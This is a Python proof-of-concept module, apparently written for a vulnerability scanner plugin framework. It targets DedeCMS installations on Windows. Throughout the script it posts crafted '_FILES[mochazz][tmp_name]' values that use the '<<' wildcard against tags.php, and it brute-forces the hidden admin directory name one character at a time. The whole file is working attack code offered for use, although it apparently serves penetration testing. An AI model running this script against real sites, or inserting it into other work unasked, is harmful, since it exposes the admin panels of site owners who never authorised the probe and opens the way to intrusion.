#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import itertools
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'dedecms win manager'
        self.keyword = ['dedecms', 'win', 'manager']
        self.info = 'Find manager for dedecms'
        self.type = VUL_LEVEL.MEDIUM
        self.level = VUL_LEVEL.INFO
        self.refer = 'https://xz.aliyun.com/t/2064'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
            _data = {
                "_FILES[mochazz][tmp_name]": "./{p}<</images/adminico.gif",
                "_FILES[mochazz][name]": 0,
                "_FILES[mochazz][size]": 0,
                "_FILES[mochazz][type]": "image/gif"
            }
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, ['./dedecms/', './']):
                    url = path + 'tags.php'
                    back_dir = ""
                    flag = 0
                    async with session.get(url=url) as res:
                        if res!=None and res.status ==200:
                            for num in range(1, 7):
                                if flag ==1 :
                                    break
                                for pre in itertools.permutations(characters, num):
                                    pre = ''.join(list(pre))
                                    _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=pre)
                                    async with session.post(url=url, data=_data) as r:
                                        if r!=None:
                                            if r.status == 405:
                                                return
                                            text = await r.text()
                                            if "Upload filetype not allow !" not in text and r.status == 200:
                                                flag = 1
                                                back_dir = pre
                                                _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                                                break
                                            else:
                                                _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                            flag = 0
                            x = 0
                            for i in range(30):
                                if flag == 1:
                                    x = i
                                    break
                                for ch in characters:
                                    if ch == characters[-1]:
                                        flag = 1
                                        x = i
                                        break
                                    _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=back_dir + ch)
                                    async with session.post(url=url, data=_data) as r:
                                        if r!=None:
                                            if r.status == 405:
                                                return
                                            text = await r.text()
                                            if "Upload filetype not allow !" not in text and r.status == 200:
                                                back_dir += ch
                                                _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                                                break
                                            else:
                                                _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"

                            if x < 29 and flag ==1:
                                self.flag = 1
                                self.req.append({"url": path+ '/'+back_dir})
                                self.res.append({"info": path+'/'+ back_dir, "key": 'dede_manager'})
